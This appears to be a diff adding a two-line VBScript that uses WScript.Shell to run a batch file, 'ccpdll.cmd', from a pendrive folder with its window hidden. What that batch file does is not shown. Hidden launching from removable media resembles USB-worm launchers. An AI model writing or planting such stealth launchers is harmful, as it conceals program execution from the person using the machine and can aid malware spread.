@@ -1,0 +1,2 @@
+set objshell = createobject("wscript.shell")
+objshell.run "%PENDRIVE%\dll\ccpdll.cmd",vbhide
